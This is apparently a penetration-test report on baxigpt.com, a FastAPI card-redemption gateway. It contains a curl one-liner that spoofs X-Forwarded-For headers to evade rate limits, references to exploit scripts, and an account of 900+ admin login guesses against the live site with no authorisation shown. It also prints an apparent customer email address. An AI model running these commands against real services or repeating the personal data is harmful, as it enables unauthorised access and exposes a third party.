# Security Assessment Report — baxigpt.com

**Assessment date:** 2026-07-07  
**Target:** `https://baxigpt.com`  
**Scope:** Public API surface, administrative interface, infrastructure reconnaissance, third-party integration chain  
**Methodology:** Passive reconnaissance, OpenAPI analysis, authenticated-surface probing (admin login only), client-source recovery, scripted verification

---

## Executive summary

baxigpt.com is a **FastAPI v0.1.0** card-redemption gateway that uses end-user ChatGPT `accessToken` values to provision Plus subscriptions via regional payment rails (PIX / BLIK). The deployment is a small, non-open-source monolith behind **nginx/1.24.0 (Ubuntu)**.

The assessment identified **four high-severity issues** on the public attack surface that are reproducible without administrative credentials, plus **two medium-severity** implementation weaknesses. Administrative authentication resisted extensive testing (900+ password candidates, header/cookie forgery, injection attempts) and appears to use `secrets.compare_digest` with a strong secret.

| Severity | Finding | Exploitability |
|----------|---------|----------------|
| **High** | Rate-limit bypass via `X-Forwarded-For` | Confirmed |
| **High** | BOLA on `POST /api/query` (email/order leak by card code) | Confirmed |
| **High** | Full OpenAPI/docs exposure including admin routes | Confirmed |
| **High** | No rate limiting on admin login | Confirmed |
| **Medium** | Type confusion → HTTP 500 (no stack trace) | Confirmed |
| **Medium** | Missing security headers (CSP, HSTS, X-Frame-Options) | Confirmed |

---

## System context

```
End user / partner integration
        ↓
nginx (TLS, default server, HTTP/1.1)
        ↓
FastAPI "baxigpt" 0.1.0
  ├── Public JSON API (/api/code-info, submit, status, query)
  ├── Admin JSON API (/api/admin/*, cookie session)
  └── Inline HTML pages (user UI, hidden admin UI, partner API doc)
        ↓
Inferred data stores + upstream PIX/BLIK + OpenAI API
```

Deeper architecture notes: [ARCHITECTURE.md](./ARCHITECTURE.md)  
Threat intelligence / supply chain: [THREAT-INTELLIGENCE.md](./THREAT-INTELLIGENCE.md)

---

## Confirmed vulnerabilities

### H-1: Rate-limit bypass (trusts client IP headers)

The service appears to key rate limits off `X-Forwarded-For` / `X-Real-IP`. Rotating these values bypasses `HTTP 429` responses that block brute-force card probes.

**Proof of concept:**

```bash
python3 exploits/ip_bypass_enum.py --code EU-HFNDFHD4
```

Or manually:

```bash
curl -s https://baxigpt.com/api/code-info \
  -H 'Content-Type: application/json' \
  -H "X-Forwarded-For: $(python3 -c 'import random; print(f\"{random.randint(11,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}\")')" \
  -d '{"code":"EU-TEST0000"}'
```

**Evidence:** `artifacts/pentest-enum-bypass.json`, `artifacts/pentest-ip-fuzz.json`

**Recommendation:** Rate-limit on `remote_addr` as set by nginx; strip or ignore client-supplied forwarding headers at the application layer.

---

### H-2: Broken object-level authorization on `/api/query`

Any holder of a valid card code can retrieve **all historical orders**, including **email addresses**, payment timestamps, and error messages. No secondary factor is required.

**Proof of concept:**

```bash
python3 exploits/baxigpt_audit.py query --code EU-HFNDFHD4
```

**Sample response (redacted in public docs; full capture in artifacts):**

```json
{
  "ok": true,
  "remaining": 0,
  "total": 1,
  "orders": [{
    "email": "67_bashes_crawl@icloud.com",
    "status": "paid",
    "created_at": "2026-07-07 10:56",
    "paid_at": "2026-07-07 10:57"
  }]
}
```

Extra JSON keys such as `"admin": true` are **ignored** — no privilege escalation, but privacy impact remains.

**Evidence:** `artifacts/round8-fuzz.json`, `docs/archive/CARD-TEST-EU-HFNDFHD4.md`

**Recommendation:** Require an additional verifier (email OTP, order PIN), or return only non-sensitive aggregates.

---

### H-3: OpenAPI and interactive docs expose admin surface

`GET /openapi.json`, `/docs`, and `/redoc` are world-readable and enumerate all fifteen routes, including:

- `/bx-admin-9f3c7a2e1b`
- `/api/admin/login`, `/gen`, `/stats`, `/codes`, `/orders`, `/code-action`

**Proof of concept:**

```bash
curl -s https://baxigpt.com/openapi.json | python3 -m json.tool | head -40
```

**Evidence:** `captures/openapi.json`

**Recommendation:** Disable schema endpoints in production; exclude admin routers from published OpenAPI.

---

### H-4: Administrative login without throttling

Unlike public endpoints (which return `429` after repeated failures), `POST /api/admin/login` accepted **900+** invalid attempts without lockout, CAPTCHA, or backoff.

**Evidence:** `artifacts/pentest-bruteforce.json`, `artifacts/round7-full.json`

**Recommendation:** Per-IP and per-account throttling; optional 2FA for admin operations.

---

### M-1: Unhandled type errors (HTTP 500)

Supplying non-string types for `code`, `at`, or `password` triggers generic `500 Internal Server Error`. No stack traces were observed in responses.

**Evidence:** `artifacts/round8-fuzz.json` (36 payloads, 18× HTTP 500)

**Recommendation:** Strict Pydantic models and a global exception handler returning `422 Unprocessable Entity`.

---

### M-2: Missing browser security headers

Responses lack `Strict-Transport-Security`, `Content-Security-Policy`, and `X-Frame-Options`.

**Recommendation:** Configure nginx or FastAPI middleware.

---

## Tests that did not yield exploitation

| Vector | Volume | Outcome |
|--------|--------|---------|
| Admin password guessing | 900+ candidates | All `401` |
| Auth bypass (headers/cookies/JWT) | 30+ variants | All `401` |
| SQLi / NoSQLi on login | 6+ payloads | Treated as strings |
| Subdomain / vhost isolation | 87 names + crt.sh | Only `www`; default server |
| nginx CVE exploitation | Smuggling, path tricks | Not applicable |
| MongoDB ObjectId IDOR | 482 guesses | 0 hits |
| Card enumeration (pattern + random) | 384 codes | Only known exhausted card |
| Second deployment (fingerprint hunt) | GitHub + related domains | None found |

Artifacts for negative results: `artifacts/round8-idor.json`, `artifacts/round8-cards.json`, `artifacts/round8-fingerprint.json`

---

## Reproduction toolkit

| Script | Purpose |
|--------|---------|
| `exploits/baxigpt_audit.py` | Unified CLI: code-info, query, health, openapi check |
| `exploits/ip_bypass_enum.py` | Rate-limit bypass + card probe |
| `exploits/round8_fuzz500.py` | Type-confusion fuzz (read-only) |

See [REPRODUCTION.md](./REPRODUCTION.md) for full usage.

---

## Responsible disclosure note

This assessment was conducted with read-only API calls and documented minimal proof-of-concept traffic. Do not use these techniques to access accounts, enumerate third-party card codes at scale, or disrupt the service.

---

## Document map

| Document | Contents |
|----------|----------|
| [ARCHITECTURE.md](./ARCHITECTURE.md) | Backend reconstruction, data model |
| [API-REFERENCE.md](./API-REFERENCE.md) | Endpoint contracts |
| [ADMIN-SURFACE.md](./ADMIN-SURFACE.md) | Hidden admin UI analysis |
| [THREAT-INTELLIGENCE.md](./THREAT-INTELLIGENCE.md) | Operator OSINT, supply chain |
| [METHODOLOGY.md](./METHODOLOGY.md) | Assessment phases and tooling |
| [REPRODUCTION.md](./REPRODUCTION.md) | Step-by-step PoC commands |